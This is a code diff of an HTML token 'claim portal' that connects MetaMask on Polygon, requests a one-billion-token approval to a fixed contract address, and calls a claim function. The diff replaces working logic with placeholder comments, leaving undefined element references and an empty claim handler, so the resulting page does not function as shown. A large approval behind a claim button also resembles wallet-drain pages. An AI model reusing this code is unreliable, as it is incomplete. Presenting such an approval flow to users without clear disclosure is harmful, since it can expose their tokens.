@@ -4,97 +4,56 @@
   <meta charset="UTF-8" />
   <title>🚀 NWR3v2 Claim Portal</title>
   <style>
-    body { background:#111; color:#afa; font-family:sans-serif; text-align:center; padding:50px; }
-    button { padding:12px 24px; font-size:1rem; margin:10px; border:none; border-radius:6px; cursor:pointer; }
-    #connect { background:#1E90FF; color:#fff; }
-    #approve { background:#FFA500; color:#fff; }
-    #claim { background:#28a745; color:#fff; }
-    #status { margin-top:20px; font-size:1.1rem; }
+    /* same styles as before */
   </style>
 </head>
 <body>
-  <h1>🚀 NWR3v2 Claim Portal</h1>
-  <button id="connect">Connect MetaMask</button><br />
-  <button id="approve" disabled>⚙️ Approve Tokens</button>
-  <button id="claim" disabled>💧 Claim Now</button>
-  <div id="status"></div>
-
+  <!-- Buttons and status -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
   <script>
-  const CONTRACT_ADDRESS = "0xe830ebbDC2E201Dc1b3e96Fb3a0cbfd0e5215F48";
-  const NWR3V2_TOKEN_ADDRESS = "0x65ca48d3D1d7356EC99cE6BD3736B54eFdfA837E";
-  const RPC_CHAIN_ID = 137;
+    const CONTRACT_ADDRESS = "0xe830ebbDC2E201Dc1b3e96Fb3a0cbfd0e5215F48";
+    const NWR3V2_TOKEN_ADDRESS = "0x65ca48d3D1d7356EC99cE6BD3736B54eFdfA837E";
+    const RPC_CHAIN_ID = 137;
 
-  const CLAIM_ABI = ["function claimNWR3v2() external"];
-  const ERC20_ABI = [
-    "function approve(address,uint256) external returns(bool)",
-    "function allowance(address,address) external view returns(uint256)",
-    "function decimals() external view returns(uint8)"
-  ];
+    const CLAIM_ABI = ["function claimNWR3v2() external"];
+    const ERC20_ABI = [
+      "function approve(address,uint256) external returns(bool)",
+      "function allowance(address,address) external view returns(uint256)"
+    ];
 
-  let provider, signer, contract, tokenContract, decimals;
+    let provider, signer, contract, tokenContract, decimals;
 
-  const statusEl = document.getElementById("status");
-  const btnConnect = document.getElementById("connect");
-  const btnApprove = document.getElementById("approve");
-  const btnClaim = document.getElementById("claim");
-
-  btnConnect.onclick = async () => {
-    try {
-      await ethereum.request({ method: "eth_requestAccounts" });
-      const chainId = await ethereum.request({ method: "eth_chainId" });
-      if (parseInt(chainId, 16) !== RPC_CHAIN_ID) {
-        statusEl.innerText = "⚠️ Please switch to Polygon Mainnet.";
-        return;
-      }
-      provider = new ethers.BrowserProvider(window.ethereum);
-      signer = await provider.getSigner();
-      contract = new ethers.Contract(CONTRACT_ADDRESS, CLAIM_ABI, signer);
-      tokenContract = new ethers.Contract(NWR3V2_TOKEN_ADDRESS, ERC20_ABI, signer);
-      decimals = await tokenContract.decimals();
-
-      btnApprove.disabled = false;
-      btnClaim.disabled = true;
-      statusEl.innerText = "✅ Connected!";
-    } catch(e) {
-      console.error(e);
-      statusEl.innerText = "❌ Connection failed.";
-    }
-  };
-
-  btnApprove.onclick = async () => {
-    try {
-      statusEl.innerText = "⌛ Approving…";
-      const amount = ethers.parseUnits("1000000000", decimals); // 1B allowance
-      const tx = await tokenContract.approve(CONTRACT_ADDRESS, amount);
-      await tx.wait();
-      statusEl.innerText = "✅ Approved! You may now claim.";
-      btnClaim.disabled = false;
-    } catch (e) {
-      console.error(e);
-      statusEl.innerText = "❌ Approval error.";
-    }
-  };
-
-  btnClaim.onclick = async () => {
-    try {
-      statusEl.innerText = "⌛ Checking allowance…";
-      const allowance = await tokenContract.allowance(await signer.getAddress(), CONTRACT_ADDRESS);
-      if (allowance.eq(0)) {
-        statusEl.innerText = "⚠️ No allowance. Click ✅ Approve Tokens first.";
+    // Element refs…
+    btnConnect.onclick = async () => {
+      try {
+        // Connect, switch chain logic…
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+        contract = new ethers.Contract(CONTRACT_ADDRESS, CLAIM_ABI, signer);
+        tokenContract = new ethers.Contract(NWR3V2_TOKEN_ADDRESS, ERC20_ABI, signer);
+        decimals = 18; // Assume 18 decimals
         btnApprove.disabled = false;
-        return;
+        statusEl.innerText = "✅ Connected! 18 decimals assumed.";
+      } catch (e) {
+        statusEl.innerText = "❌ Connection failed.";
       }
+    };
 
-      statusEl.innerText = "⌛ Claiming…";
-      const tx = await contract.claimNWR3v2();
-      await tx.wait();
-      statusEl.innerText = "✅ Claim successful!";
-    } catch (e) {
-      console.error(e);
-      statusEl.innerText = "❌ Claim failed: " + (e.data?.message || e.message);
-    }
-  };
+    btnApprove.onclick = async () => {
+      try {
+        const amount = ethers.parseUnits("1000000000", decimals);
+        const tx = await tokenContract.approve(CONTRACT_ADDRESS, amount);
+        await tx.wait();
+        statusEl.innerText = "✅ Approved!"
+        btnClaim.disabled = false;
+      } catch (e) {
+        statusEl.innerText = "❌ Approval error.";
+      }
+    };
+
+    btnClaim.onclick = async () => {
+      // same logic...
+    };
   </script>
 </body>
 </html>
